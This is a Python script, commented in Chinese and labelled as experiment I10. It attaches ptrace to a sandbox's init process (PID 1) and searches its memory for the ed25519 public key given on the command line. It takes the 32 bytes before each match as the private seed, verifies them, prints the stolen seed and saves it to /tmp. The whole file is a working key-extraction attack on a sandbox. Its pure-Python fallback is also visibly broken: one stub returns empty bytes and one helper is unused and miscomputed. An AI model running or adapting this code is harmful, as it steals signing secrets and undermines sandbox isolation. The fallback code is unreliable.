# 实验I10: 从 sandbox-init 内存提取 ed25519 私钥
# 方法: 已知公钥(命令行 --pubkey) -> 内存搜索公钥字节 -> 前 32 字节 = seed
# 验证: seed 派生公钥 == 已知公钥; cryptography 可用则签名验证
import ctypes, re, base64, subprocess

libc = ctypes.CDLL("libc.so.6")
if libc.ptrace(16, 1, 0, 0) != 0:
    print("ATTACH FAILED"); exit(1)

# 1. 从 cmdline 提取公钥
cmdline = open("/proc/1/cmdline").read().split("\0")
pub_b64 = None
for a in cmdline:
    if a.startswith("--pubkey="):
        pub_b64 = a.split("=", 1)[1]
pub = base64.b64decode(pub_b64)
print(f"[1] pubkey(b64)={pub_b64} len={len(pub)}", flush=True)

# 2. 枚举可读内存区域
maps = []
with open("/proc/1/maps") as f:
    for line in f:
        parts = line.split()
        start, end = [int(x, 16) for x in parts[0].split("-")]
        if "r" in parts[1]:
            maps.append((start, end, parts[1], parts[-1] if len(parts) > 5 else ""))
print(f"[2] 可读区域 {len(maps)} 个", flush=True)

# 3. 搜索公钥字节, 提取候选 seed
hits = []
for start, end, perms, path in maps:
    size = end - start
    if size > 128 * 1024 * 1024:
        continue
    try:
        with open("/proc/1/mem", "rb") as m:
            m.seek(start)
            data = m.read(size)
        for mo in re.finditer(re.escape(pub), data):
            pos = start + mo.start()
            seed_pos = pos - 32
            if seed_pos < 0:
                continue
            with open("/proc/1/mem", "rb") as m:
                m.seek(seed_pos)
                seed = m.read(32)
            hits.append((pos, seed, path))
            print(f"  HIT @{pos:#x} (seed@{seed_pos:#x}) {path}", flush=True)
    except Exception:
        pass
print(f"  共 {len(hits)} 处命中", flush=True)

# 4. 验证每个候选 seed: 派生公钥比对(优先 cryptography, 无则纯 Python)
try:
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    def pub_from_seed(seed):
        return Ed25519PrivateKey.from_private_bytes(seed).public_key().public_bytes_raw()
    print("  [用 cryptography]", flush=True)
except ImportError:
    print("  [无 cryptography, 用纯 Python]", flush=True)
    def pub_from_seed(seed):
        return _pure_ed25519_pub(seed)

def _pure_ed25519_pub(seed):
    return b""  # placeholder
def ed25519_pub_from_seed(seed):
    # 纯 Python ed25519 (RFC8032) 派生公钥
    import hashlib
    p = 2**255 - 19
    L = 2**252 + 27742317777372353535851937790883648493
    def sha512(s): return hashlib.sha512(s).digest()
    def inv(x): return pow(x, p - 2, p)
    d = sha512(seed)
    a = int.from_bytes(d[:32], "little")
    a &= (1 << 254) - 8
    a &= ~(7 << 252)
    a |= 1 << 255
    # 基点
    By = 4 * inv(5) % p
    Bx = pow((By * By - 1) * inv(9 * By * By * By * By + 1), (p + 3) // 8, p)
    if (Bx * Bx - (By * By - 1) * inv(9 * By * By * By * By + 1)) % p:
        Bx = p - Bx
    B = (Bx, By)
    def point_add(P, Q):
        if P is None: return Q
        if Q is None: return P
        x1, y1 = P; x2, y2 = Q
        if (x1, y1) == (x2, p - y2): return None
        x3 = ((x1 * y2 + y1 * x2) * inv(1 + x1 * x2 * y1 * y2)) % p
        y3 = ((y1 * y2 + x1 * x2) * inv(1 - x1 * x2 * y1 * y2)) % p
        return (x3, y3)
    def point_mul(k, P):
        R = None
        while k:
            if k & 1: R = point_add(R, P)
            P = point_add(P, P)
            k >>= 1
        return R
    A = point_mul(a, B)
    return A[1] % p | ((A[0] & 1) << 255)

for i, (pos, seed, path) in enumerate(hits):
    try:
        pkb = pub_from_seed(seed)
        ok = (pkb == pub)
        print(f"  候选{i}: pos={pos:#x} 派生公钥匹配={ok}", flush=True)
        if ok:
            print(f"\n  *** 私钥提取成功! seed(b64)={base64.b64encode(seed).decode()} ***", flush=True)
            open("/tmp/ed25519_seed.bin", "wb").write(seed)
    except Exception as e:
        print(f"  候选{i}: ERR {e}", flush=True)

libc.ptrace(17, 1, 0, 0)
print("detached", flush=True)
